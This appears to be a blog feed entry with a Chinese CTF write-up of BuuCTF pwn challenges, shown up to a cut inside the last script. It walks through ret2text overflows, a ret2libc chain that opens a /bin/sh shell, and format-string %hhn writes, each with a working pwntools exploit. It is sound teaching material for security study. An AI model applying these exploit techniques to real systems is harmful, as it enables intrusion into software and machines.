    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="STL" scheme="https://0410wzn.top/tags/STL/"/>
    
  </entry>
  
  <entry>
    <title>BuuCTF Pwn WP</title>
    <link href="https://0410wzn.top/2022/01/06/BuuCTF-Pwn-WP/"/>
    <id>https://0410wzn.top/2022/01/06/BuuCTF-Pwn-WP/</id>
    <published>2022-01-06T13:54:07.000Z</published>
    <updated>2022-02-07T15:35:48.044Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BuuCTF-Pwn-WP"><a href="#BuuCTF-Pwn-WP" class="headerlink" title="BuuCTF Pwn WP"></a>BuuCTF Pwn WP</h1><p>题目地址：</p><blockquote><p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p><strong><font size="5px">知识点：栈溢出    re2text</font></strong></p><p>先看一下文件进制和保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222253466.png"></p><p>很好，什么都没开，我们使用64位的ida分析一下文件</p><p>主函数如图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222428407.png" alt="image-20220106222428407"></p><p>gets()函数存在明显风险，双击s，发现占15个字符</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222648915.png" alt="image-20220106222648915"></p><p>查看函数，发现已有后门函数fun</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106222906423.png" alt="image-20220106222906423"></p><p>构造exp，因为pwn1为64位程序，所以要补充8字节填上esp，返回fun的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">fun = <span class="number">0x401186</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">15</span> + <span class="number">8</span>) + p64(fun)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>本脚本在本地打通了程序，但是当笔者打靶机(Unbuntu18)的时候，却怎么也打不通，为什么呢？</p><h3 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h3><p>—— ubuntu libc 为 libc2.27，高版本的libc要求是返回地址必须是16字节对齐（也可以说，远程环境是 ubuntu18，64位的程序则需要考虑堆栈平衡的问题）</p><p>我们通过添加一个 ret 指令来使16字节对齐</p><blockquote><p>ROPgadget –binary 文件名 –only “pop|ret”</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220106225801614.png" alt="image-20220106225801614"></p><p>找到ret地址，再次构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/pwn1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">fun = <span class="number">0x401186</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">15</span> + <span class="number">8</span>) + p64(ret) + p64(fun)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>打通了！！！</p><hr><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p><strong><font size="5px">知识点：栈溢出    re2text</font></strong></p><p>首先检查保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111174521470.png" alt="image-20220111174521470"></p><p>什么都没开，我直呼好耶！</p><p>接着ida分析一下，F5查看伪代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111175030533.png" alt="image-20220111175030533"></p><p>可以很明显的的发现gets函数存在明显的栈溢出风险，同时我们注意到了sub_40060D函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111175347016.png" alt="image-20220111175347016"></p><p>其中明显有获取flag的指令，我们的思路很明确了，通过栈溢出，返回到system函数的地址即可</p><p>在这里给出两个获取偏移地址的方法：</p><h3 id="获取偏移地址"><a href="#获取偏移地址" class="headerlink" title="获取偏移地址"></a>获取偏移地址</h3><p><strong>方法一</strong></p><p>我们观察到gets函数读入的是v5，而v5偏移量为0x40，再加上64位ELF文件填充esp需要8字节，即72字节</p><p><strong>方法二</strong></p><p>使用gdb来获取</p><p>使用<font color="red"><code>pattern create 200</code></font>生成溢出字符，但注意，在生成时要保证其能覆盖到RIP</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181211228.png" alt="image-20220111181211228"></p><p>执行 <font color="red"><code>r</code> </font>或者<font color="red"> <code>start</code> </font>命令让程序运行。//注意<font color="red"> <code>start</code> </font>命令执行后，还需执行<font color="red"> <code>contin</code> </font>命令。</p><p>在 <font color="red"><code>please input</code> </font>命令后，将之前生成的溢出字符串粘贴上去。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181501942.png" alt="image-20220111181501942"></p><p>（1）得到RBP寄存器中 ‘AAdAA3AA’ 。往该字符串后，随便复制一串，进行偏移量计算</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181737729.png" alt="image-20220111181737729"></p><p>执行 <font color="red"><code>pattern offset xxxxxx</code> </font>命令</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111181757313.png" alt="image-20220111181757313"></p><p>（2）复制<font color="red"> <code>stack</code> </font>复制栈顶的字符串  前四个字节（==64 bits为前8个字节==） 计算偏移量</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111182130097.png" alt="image-20220111182130097"></p><p>如上</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111182147634.png" alt="image-20220111182147634"></p><p>构造exp即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/warmup_csaw_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p><strong><font size="5px">知识点：栈溢出    覆盖变量值</font></strong></p><p>首先查看保护机制</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112162031003.png" alt="image-20220112162031003"></p><p>跟上面几题不同，本题开启了栈不可执行(NX)，这就是说，上两题中通过直接栈溢出执行shellcode的思路不再适用，下面我们通过ida来分析，首先看主函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112162531714.png" alt="image-20220112162531714"></p><p>主函数并没有什么明显的突破点，不过主函数中间还有个func()函数，让我们去看看它</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112162631073.png" alt="image-20220112162631073"></p><p>可以发现，func()函数中存在着明显的漏洞，而且，函数中包括了查看flag的命令，通过观察函数我们知道，当v2的值为11.28125时会执行此命令，至此，我们的思路已经非常清晰了——通过v1进行栈溢出，改写v2的值，使<code>cat flag</code>的命令执行</p><p>观察栈</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112163200404.png" alt="image-20220112163200404"></p><p>可知,v1所占的空间为<code>0x30 - 0x04</code>(0x2c)（这里还有第二种理解方法，通过本题的第一幅图我们知道，v2和esp距离为2c，所以直接填上0x2c），同时我们写要输入v2的值（16进制呦），构造如下wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/ciscn_2019_n_1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x04</span>) + p64(<span class="number">0x41348000</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p><strong><font size="5px">知识点：栈溢出    re2text</font></strong></p><p>第一步，查看保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112165109649.png" alt="image-20220112165109649"></p><p>打开了栈不可执行，使用ida打开观察</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112165907727.png" alt="image-20220112165907727"></p><p>主函数引我们去看vuln()函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112165942120.png" alt="image-20220112165942120"></p><p>emmm，着实看不太懂，我们能知道的，就是fgets()函数有32字节的输入长度限制，还有明显的“I”和“you”，以及一个replace()替换函数，先去运行一下吧，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112173536176.png" alt="image-20220112173536176"></p><p>我们输入“I”、“you”和随便一个其它字符，可以明显地发现，只有当输入“I”的时候，程序输出的值发生了变化，每个“I”，都分别变成了“you”，所以上面的replace()函数作用应该就是把“I”和”you”替换</p><p>简单了解程序后，我们回到ida，继续观察程序，不难发现，在程序中，存在一个名为“get_flag”的函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112174121664.png" alt="image-20220112174121664"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112175426163.png" alt="image-20220112175426163"></p><p>很明显，这个函数就是我们最后要返回的函数，地址为0x8048F0D</p><p>回到vuln()函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112180401235.png" alt="image-20220112180401235"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220112180412540.png" alt="image-20220112180412540"></p><p>我们可以知道，s字符串所占的字节长度为60字节（<code>3 * 16 + 12 = 60 </code>），而fgets()函数规定了输入的长度最长为32，这表明我们通过直接输入字符是无法将s覆盖的，该怎么办呢？</p><p>通过刚才对程序的分析，我们知道，程序会将“I”转换成“you”，这不就将1个字节转换为3个字节了吗！</p><p>需要覆盖60个字节，就只输入20个“I“即可！（==别忘了32位程序ebp的4个字节==）</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/pwn1_sctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p32(<span class="number">0x8048F0D</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p><strong><font size="5px">知识点：栈溢出    re2text</font></strong></p><p>查看一下保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113085215834.png" alt="image-20220113085215834"></p><p>hh，蛮好的，只开了NX</p><p>使用ida查看一下伪代码</p><p>main函数，pass</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113085320899.png" alt="image-20220113085320899"></p><p>看一下vulnerable_function()函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113085404264.png" alt="image-20220113085404264"></p><p>不出意外。栈溢出应该是这里发生的</p><p>在函数中，我们发现了callsystem函数，众所周知，这是个好函数名</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113085516371.png" alt="image-20220113085516371"></p><p>果然如此</p><p>由上述分析过程我们可以知道，本题的思路是通过read进行栈溢出，最后返回callsystem的地址</p><p>构造exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;/home/kali/Desktop/level0&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x80</span> + <span class="number">8</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">        </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p><strong><font size="5px">知识点：栈溢出    ret2libc</font></strong></p><p>首先检查保护措施</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220117224305676.png" alt="image-20220117224305676"></p><p>打开了栈不可执行</p><p>用ida查看函数的伪代码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113214008101.png" alt="image-20220113214008101"></p><p>主函数并没有什么明显的泄漏点，我们发现主函数引用了encrpty()函数，去看看这个函数</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113214537036.png" alt="image-20220113214537036"></p><p>很好，这个函数里有明显的溢出点gets()，发现溢出点之后，我们需要寻找函数内部是否有可用的函数段</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113214904475.png" alt="image-20220113214904475"></p><p>很遗憾，这个程序里既没有system函数，也没有/bin/sh命令，于是想到这道题可能需要通过libc泄露来做</p><p>具体思路如下</p><blockquote><p>1.先通过一次栈溢出，将puts的plt地址放到返回处，通过代码中的puts(输出)功能泄露出执行过的函数(puts)的got地址</p><p>2.将puts的返回地址设置为_start函数（我们在ida中看到的main()函数是用户代码的入口，是对于用户而言），而start函数是系统代码入口，是程序最初被执行的地方，也就是程序真正的入口），以用来执行system(‘/bin/sh’)</p><p>3.通过泄露出的got地址计算出libc中的system和/bin/sh的地址（system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。）</p><p>4.再次执行栈溢出，把返回地址换成system的地址达到getshell</p></blockquote><p>有思路之后，我们回到函数进行分析</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113214537036.png" alt="image-20220113214537036"></p><p>由上述思路可知，本题需要两次传入payload进行栈溢出</p><p><em><strong>第一次溢出：</strong></em></p><p>观察函数可知，如果<code>v0 &gt;= strlen(s)</code>,就会对我们输入的payload进行一系列”操作“，为了避免这种状况，我们可以利用strlen()函数读到’\0’停止的特性，先向其中传入’\0’</p><p>观察s</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113224206053.png" alt="image-20220113224206053"></p><p>我们需要向其中输入的垃圾字节为<code>0x50 + 0x08 - 1</code></p><blockquote><p>64位程序中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p>puts只有一个参数，就找rdi就行</p></blockquote><p>通过ROPgadget，我们找到了rdi的返回地址<code>0x400c83</code></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113225117543.png" alt="image-20220113225117543"></p><p>之后就是输入puts的got地址和plt地址，并返回主函数准备下一次溢出</p><p><em><strong>第二次溢出：</strong></em></p><p>大致前几步与第一次一样，最后通过LibcSearcher找到/bin/sh和system的地址，需要注意的是，由于是ubuntu，环境要求栈平衡，所以需要ret来使栈平衡</p><p><em><strong>总结思路：</strong></em></p><p><strong>First</strong></p><ul><li><code>&#39;\0&#39;</code>绕过strlen()</li><li><code>&#39;\0&#39; </code>和<code>(0x50 + 0x08 - 1)</code>一起覆盖s，并进行栈溢出</li><li><code>p64(rdi_ret)</code></li><li><code>p64(puts_got)</code></li><li><code>p64(puts_plt)</code></li><li><code>p64(main_addr)</code></li></ul><p><strong>Second</strong></p><ul><li><code>&#39;\0&#39;</code>绕过strlen()</li><li><code>&#39;\0&#39; </code>和<code>(0x50 + 0x08 - 1)</code>一起覆盖s，并进行栈溢出</li><li>为保持栈平衡，输入<code>p64(ret)</code></li><li><code>p64(rdi_ret)</code></li><li><code>p64(binsh)</code></li><li><code>p64(sys_addr)</code></li></ul><p>最后很奇怪的，试了多次之后本地都没有打通，反而在使用LibcSearcher之后线上打通了，下面把两个wp放在下面，<font color="red"><strong>希望发现错误的师傅在下面留言，救救孩子</strong></font>🥰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25334</span>)</span><br><span class="line">io = process(<span class="string">&#x27;/home/w/桌面/ciscn_2019_c_1&#x27;</span> )</span><br><span class="line">elf = ELF(<span class="string">&#x27;/home/w/桌面/ciscn_2019_c_1&#x27;</span> )</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/w/桌面/libc-2.27.so&#x27;</span> )</span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0000000000400B28</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span> - <span class="number">1</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#recvuntil(&#x27;\x7f&#x27;)[-6:],意思是接收到 \x7f，然后把从这往前6字节长度取出来</span></span><br><span class="line"><span class="comment">#ljust(8, &#x27;\x00&#x27;)，补齐8个字节</span></span><br><span class="line"><span class="comment">#目的是使用u64解小端序恢复正常顺序</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">ret =<span class="number">0x00000000004006b9</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">sys_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.symbols[&quot;/bin/sh&quot;].next()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">0x8</span> - <span class="number">1</span>) + p64(ret) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>, payload2)</span><br><span class="line">       </span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>补充知识：</p><ul><li>32位系统，libc的函数地址是\xf7开头，长度4字节。</li><li>64位系统，libc的函数地址是\x7f开头，长度6字节。</li></ul><hr><h2 id="第五空间2019第五主题-PWN5"><a href="#第五空间2019第五主题-PWN5" class="headerlink" title="[第五空间2019第五主题]PWN5"></a>[第五空间2019第五主题]PWN5</h2><p><strong><font size="5px">知识点：格式化字符串</font></strong></p><p>老规矩，先查看保护措施，可以看见，本题打开了NX和Canary保护</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220117224305676.png" alt="image-20220117224305676"></p><p>使用ida观察伪代码，发现Canary和NX都开了，也就是说，上面的大部分思路都不适用于本题，而此时我们也可以去考虑格式化字符串漏洞</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220124212256393.png" alt="image-20220124212256393"></p><p>我们可以很明显的发现两个点，一，当<code>atoi(nptr) = dword_804C044</code>时，会调用system函数，而通过上部分的伪代码，我们可以得知由于Canary保护的开启，<code>dword_804C044</code>为一个随机的值；二，由于<code>printf(buf)</code>并未做出输出的限制，存在着明显的风险</p><p>至此，我们的思路基本就确定了：</p><ul><li>通过printf判断参数在栈上的位置</li><li>%n修改参数内容，改变数据</li><li>在进入<code>if</code>判断时输入我们覆盖随机数对应的数据，进而达到绕过Canary的效果</li></ul><p>我们先找到read的地址，即<code>0x0804928D</code>，接下来，就要计算偏移量了，明确参数在栈上的位置</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220124223608850.png" alt="image-20220124223608850"></p><p>这里提供几种方法：</p><h3 id="参数在栈上的位置"><a href="#参数在栈上的位置" class="headerlink" title="参数在栈上的位置"></a>参数在栈上的位置</h3><p>第一种，火眼金睛</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220124224424084.png" alt="image-20220124224424084"></p><p>这里再查看栈</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220124224457611.png" alt="image-20220124224457611"></p><p>数出来就是10!!!</p><p>第二种，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220124225558720.png" alt="image-20220124225558720"><br>AAAA对应的十六进制是41414141，可以看到我们输入的参数是在栈上的第10个位置</p><p>第三种</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220124225929349.png" alt="image-20220124225929349"></p><p>在确定好偏移值后，我们查看随机数的字节数——是4字节</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220124230446052.png" alt="image-20220124230446052"></p><p>因此，我们可以在输入地址后，分别用<code>%(10 - 13)$hhn</code>去修改bss数据段里的内容，构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/home/w/桌面/pwn&#x27;</span> )</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x0804C044</span>;</span><br><span class="line"></span><br><span class="line">payload = p32(addr) + p32(addr + <span class="number">1</span>) + p32(addr + <span class="number">2</span>) + p32(addr + <span class="number">3</span>) + <span class="string">b&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line"><span class="comment">#每个字节都改成了0x10，所以这个数字就是0x10101010</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span 